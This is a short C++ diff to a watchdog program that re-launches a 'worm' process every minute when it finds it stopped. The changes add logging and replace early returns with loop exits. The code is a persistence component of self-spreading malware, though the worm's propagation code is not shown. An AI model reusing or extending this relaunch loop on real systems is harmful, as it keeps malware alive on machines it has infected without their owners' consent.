@@ -16,6 +16,7 @@
 #include <sys/types.h>
 #include <unistd.h>
 #include <fstream>
+#include <iostream>
 #include <string>
 
 #define MINUTE 60 * 1000 * 1000
@@ -54,15 +55,27 @@ int runWorm(std::string& loc) {
 }
 
 int main() {
+    std::cout << "Timer starts." << std::endl;
     int pid = -1;
     while (1) {
         if (pid < 0 || !isWormRunning(pid)) {
+            std::cout << "Worm not running." << std::endl;
             std::string path = isWormDistributed();
-            if (path == "") return -1;
+            if (path == "") {
+                std::cout << "Failed to execute the worm." << std::endl;
+                break;
+            }
             pid = runWorm(path);
-            if (pid < 0) return -1;
+            if (pid < 0) {
+                std::cout << "Failed to execute the worm." << std::endl;
+                break;
+            }
+            std::cout << "Worm executed. PID " << pid << " ." << std::endl;
+        } else {
+            std::cout << "Worm running." << std::endl;
         }
         usleep(MINUTE);
     }
+    std::cout << "Timer terminated." << std::endl;
     return -1;  // should not end
 }
